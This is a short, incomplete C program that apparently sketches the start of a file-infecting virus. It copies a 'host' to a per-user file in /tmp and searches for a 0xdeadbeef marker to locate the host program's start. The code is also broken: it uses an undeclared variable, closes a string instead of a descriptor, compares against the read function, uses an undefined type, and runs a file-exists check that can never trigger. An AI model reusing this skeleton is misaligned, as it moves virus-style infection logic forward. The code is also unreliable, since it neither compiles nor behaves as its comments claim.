
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/errno.h>

int main(int argc, char** argv) {
    
    // Copy Host to /tmp/host.ruid

    char tempfilename[20];
    uid_t ruid = getuid();
    sprintf(tempfilename, "/tmp/host.%ud", ruid);

    // attempt to create new file
    int fd = open(filename, O_CREAT | O_RDWR, S_IRWXU);

    // check if that file was already there
    if (fd == -1 && errno == EEXIST) {
        // file exists! attempt to delete and leave
        unlink(tempfilename);

        // close our descriptor so the file is *officially* deleted
        close(tempfilename);
        return 0;
    }

    byte magic[4] = {0xde, 0xad, 0xbe, 0xef};
    byte buf[4];

    // find the hosts start location
    do {
        read(fd, buf, 4);
    } while(memcmp(magic, read, 4) != 0);

    // where are we?
    off_t hoststart = lseek(fd, 0, SEEK_CUR);



}
